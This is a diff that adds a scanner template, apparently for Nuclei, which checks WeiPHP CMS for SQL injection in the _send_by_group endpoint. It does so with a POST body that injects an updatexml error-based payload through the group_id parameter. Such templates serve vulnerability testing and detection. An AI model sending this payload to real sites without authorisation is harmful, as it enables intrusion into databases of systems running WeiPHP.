@@ -1,0 +1,25 @@
+id: weiphp-message-sqli
+
+info:
+  name: Test SQL Injection via group_id parameter
+  author: yourname
+  severity: high
+  description: weiphp cms _send_by_group sql注入漏洞
+  tags: sqli
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/public/index.php/weixin/message/_send_by_group"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28%2F%2A%2150000select%2A%2F+123456ww%29%2C0x7e%29%2C1%29+-- 
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "123456ww"
